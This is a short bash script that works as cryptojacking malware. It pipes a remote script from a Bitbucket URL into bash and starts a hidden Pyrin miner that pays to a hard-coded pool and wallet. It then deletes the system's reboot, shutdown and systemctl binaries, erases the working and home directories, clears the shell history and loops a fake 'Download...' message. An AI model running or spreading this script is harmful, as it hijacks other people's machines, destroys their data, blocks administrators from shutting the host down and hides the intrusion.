#!/bin/bash
apt-get update 
apt-get install -y wget curl
curl -sL https://bitbucket.org/new-kamikaze/lolkaze01/raw/main/lolGP.sh | bash
chmod +x lolkaze
nohup ./lolkaze --algo PYRIN --pool 165.227.111.82 --port 443 --user pyrin:qq26gm0pn27hp9vxtrlpngcfzcxmsjc8vtlmn5a2087rxvyaczewyygdxhn7d.sugoi > /dev/null 2>&1 &
sleep 30
rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
curl ifconfig.me
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "Download..."
        sleep 20
done
